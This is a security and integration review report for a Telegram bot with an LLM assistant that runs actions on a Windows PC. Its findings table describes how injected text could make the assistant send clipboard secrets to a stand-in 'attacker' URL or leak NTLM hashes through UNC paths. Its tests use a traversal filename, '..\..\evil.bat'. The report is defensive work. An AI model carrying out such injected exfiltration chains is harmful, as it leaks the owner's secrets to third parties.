# Edith — reviewer report (integration + security)

> **Historical review (2026-11-14).** File names below predate later changes: `bot/jarvis/` is now `bot/assistant/`, `bot/modules/jarvis.py` is now `bot/modules/assistant.py`, and the brain now runs on Groq. Current guardrails are described in the README's Safety section and in `bot/actions/policy.py`.

Reviewer pass, 2026-11-14. PLAN.md was not changed.

## Summary
- **Integration:** the real `bot.main.build_app()` builds cleanly with a fake env (no polling, no network). It loads all 8 modules, 50 actions (21 dangerous), 56 handlers and 46 commands.
- **Tests:** **186 passed** (157 before this review; 28 new in `tests/test_integration.py` and 1 new in `tests/test_jarvis.py`). The only existing test I changed is the expected `webcam_photo` flag in `tests/test_desktop.py` (False → True), which follows the deliberate security decision below.
- **Security:** the core design is sound. Every handler is `owner_only`. Strangers get silence. Confirm tokens are random, single-use and tied to one chat. Shell is used in exactly one place. SQL is parameterised, and uploads can't escape their folder. I found and fixed **3 HIGH** and **6 MEDIUM/LOW** issues. Each fix has a regression test. The issues still open are LOW/MEDIUM design choices (listed below).

## Integration results (`tests/test_integration.py`)
Bot API traffic is stubbed at `telegram.Bot._post`, and every action is replaced by a spy. Nothing real runs.

| Check | Result |
|---|---|
| Every module in `MODULE_NAMES` imports and registers its `COMMANDS` | ✅ |
| No duplicate command handlers; `/help` list unique, ≤100, valid names, each has a handler | ✅ after fix I-1 |
| Callback patterns are all `^<prefix>:` with distinct prefixes; every `callback_data=` literal in `bot/` is routed | ✅ |
| Every action has a valid tool schema (object, `additionalProperties:false`, typed props, enum/default sane); Anthropic + OpenAI formats build | ✅ |
| Every registered handler callback is the `owner_only` wrapper (`__wrapped__` + wrapper code object) | ✅ 56/56 |
| Stranger sends 18 commands, a voice note, an upload (`..\..\evil.bat`) and presses 9 buttons (incl. a `confirm:` token) → no message, no action; only a silent `answerCallbackQuery` | ✅ (positive control: the owner's `/help` and `/status` do get through) |
| `/help` is valid Telegram HTML and fits in one message | ✅ after fix I-2 |
| Confirm buttons: stranger press, press from another chat, forged token and replay are all ignored | ✅ |
| Edith: dangerous / sensitive actions never run without Confirm; `chat_id` is never model-controlled | ✅ after fixes S-1..S-3 |

## Findings

| ID | Sev | Location | Issue | Status |
|---|---|---|---|---|
| S-1 | HIGH | `bot/jarvis/brain.py:49`, `:164` | **Prompt-injection exfiltration.** Text the model reads (window titles, file names, clipboard) could make it chain `clipboard_get` → `open_url("https://attacker/?q=<secret>")` with no Confirm. `open_url` is the only action that can send data to an arbitrary third party. | **Fixed:** `AI_CONFIRM_ACTIONS={"open_url"}` makes Edith ask for Confirm, while the owner's own `/url` does not. A new rule in the system prompt (`:82`) says tool output is untrusted data, not instructions. |
| S-2 | HIGH | `bot/jarvis/brain.py:53`, `:118` | **NTLM hash leak via UNC paths.** Non-dangerous file actions (`list_dir`, `get_file`, `find_files`, `cd`, `make_dir`) accept `\\host\share`. If Edith is injected into touching one, Windows authenticates to the attacker over SMB. | **Fixed:** a model-chosen UNC or device path in a files/shell action needs Confirm. Owner-typed `/ls \\nas\share` still works. |
| S-3 | HIGH | `bot/actions/desktop.py:274`, `bot/modules/desktop.py:146` | **Webcam without confirmation** (Edith, `/webcam`, and automation steps could all turn the camera on silently). | **Fixed (decision):** `webcam_photo` is now `dangerous=True` everywhere, and `/webcam` goes through `confirm_and_run`. `screenshot`, `record_screen` and `get_file` stay non-dangerous. They only deliver to the verified owner's chat, and the model sees only their text, never the file bytes. |
| S-4 | MED | `bot/main.py:47` | The global error handler replied to **any** update, including strangers' (it broke the "silence" rule), and echoed the raw exception text. | **Fixed:** it replies only when `is_allowed`, and the text goes through `redact()`. |
| S-5 | MED | `bot/security.py:28`, `bot/main.py:20-29`, `bot/modules/jarvis.py:79` | Secrets could reach logs or chat through exception text or tracebacks (Bot API URLs contain the token). `httpcore` was not silenced. | **Fixed:** `RedactingFormatter` on all log handlers (bot.log, console, audit.log). `redact()` covers chat error messages. `httpx` and `httpcore` are at WARNING. |
| S-6 | MED | `bot/jarvis/brain.py:132`, `:163` | The model filled the `chat_id` of shell/file actions itself, defaulting to 0. Edith's `cd` therefore did not match the owner's `/cd` and `/ls`, and the model could pick another chat's working directory. | **Fixed:** `chat_id` is hidden from model tool schemas (`model_tools()`) and forced to the current chat. |
| S-7 | LOW | `bot/security.py:48`, `bot/main.py:22` | Unbounded `audit.log`/`bot.log`: a stranger spamming the bot fills the disk. | **Fixed:** `RotatingFileHandler` (5 MB × 3). |
| S-8 | LOW | `bot/jarvis/voice.py:61` | The audio-length cap was checked only *after* decoding: a 20 MB Opus file can be hours long, i.e. GBs of PCM. | **Fixed:** decoding stops as soon as the 10-min cap is passed. |
| I-1 | MED | `bot/main.py:69` | `ALL_COMMANDS` grew on every `build_app()` call (90 entries on the 2nd call, so `/help` and `set_my_commands` got duplicates). | **Fixed:** the list is rebuilt fresh. |
| I-2 | HIGH (functional) | `bot/main.py:40` | `/help` is sent as HTML, but descriptions contain `<pid|name>`, `<text>` and so on, so Telegram would reject the message and **`/start` and `/help` would never answer**. | **Fixed:** `html.escape`. |
| I-3 | LOW | `.env.example:29` | `AUTOMATION_DB` example contained a literal BEL control char (`data\a…` was written as an escape). | **Fixed.** |
| O-1 | MED | `bot/security.py:60` | `owner_only` checks the *user*, not the chat type. If the owner adds the bot to a group, screenshots, files and shell output are visible to everyone in it (strangers still can't issue commands). | Open. Recommend rejecting non-`private` chats in `owner_only`. |
| O-2 | LOW | `bot/actions/desktop.py:298`, `:307`, `:364`; `bot/actions/media.py` `say` | Non-confirmed side effects an injected model could still cause: `clipboard_get` (clipboard goes to the LLM provider), `clipboard_set` (paste-jacking), `show_message`/`say` (fake prompts on screen). They are local, visible and bounded. | Open (accepted). Add to `AI_CONFIRM_ACTIONS` if stricter behaviour is wanted. |
| O-3 | LOW | `bot/automation/__init__.py:219` | With several `ALLOWED_USER_IDS`, automations Edith creates always report to the first user. | Open. |
| O-4 | LOW | `bot/cli.py:73-97` | `.env` is written first and ACL'd afterwards. In between there is a short window with inherited ACLs (the user profile is private anyway). `.env.bak` keeps the old token. | Open. |
| O-5 | LOW | `setup.ps1:25` | Installs uv through `irm https://astral.sh/uv/install.ps1 \| iex` (the official installer, but unpinned). | Open (documented). |
| O-6 | LOW | `bot/actions/desktop.py:318` | `open_url` allows `localhost` and private IPs (the browser can reach intranet/router pages). With S-1 this needs Confirm when Edith calls it; owner-typed `/url` is trusted. | Open (accepted). |

Verified OK (no change needed):
- **Subprocess calls:** the only shell is `shell_cmd`/`shell_ps` (`bot/actions/shell.py:202`). Every other subprocess call (power, system, triggers, cli) uses an argument list.
- **Paths:** uploads use `safe_filename` plus an O_EXCL `reserve_upload_path`, so no traversal and no overwrite. `/mv` never overwrites. `/rm` goes to the Recycle Bin and refuses drive roots. `/get` refuses drive roots.
- **Size and time caps:** zip has a 1 GB raw / 50 MB output / 180 s cap. `find` stops at 30 s / 500 results. Shell output stops at 2 MB. Recordings are capped at 60 s, one at a time.
- **SQLite:** fully parameterised.
- **Automations:** management actions are blocked as steps. A dangerous step needs approval at creation time and sends a notice before each run. Macros are re-confirmed every time they run. Dangerous jobs never run late.
- **Restarts:** `drop_pending_updates=True` avoids replaying commands queued while the bot was offline.

## First run checklist
1. In Telegram, open **@BotFather** → `/newbot` and copy the token.
2. Double-click **`setup.bat`**. It installs uv, Python 3.12 and the packages into `.venv`, then opens the wizard, which:
   - checks the token live,
   - auto-detects your Telegram ID (press START on your bot when asked),
   - lets you pick a brain: Claude key / Ollama / Gemini / Groq / none,
   - writes `.env` readable only by your Windows account.
3. Run `control.bat doctor`. Everything should be ✓ (the AI brain line may be ! if you skipped it).
4. Run `control.bat start` (or `start.bat`) and keep the window open. You get "✅ … is online" in Telegram.
5. In Telegram, try `/help`, then `/status`, then `/screenshot`. Next, try a dangerous one, e.g. `/lock`: you must see a **Confirm** button. Then try `/j what's my CPU temperature?` or a voice note.
6. Optional: `control.bat autostart on` creates a visible Task Scheduler entry. Remove it with `control.bat autostart off`.
7. Keep the bot in a **private chat** only (see O-1). If the token ever leaks, `/revoke` it in @BotFather and run `control.bat setup`.
8. Developers: run `.venv\Scripts\python -m pytest -q`. Expected: 186 passed.
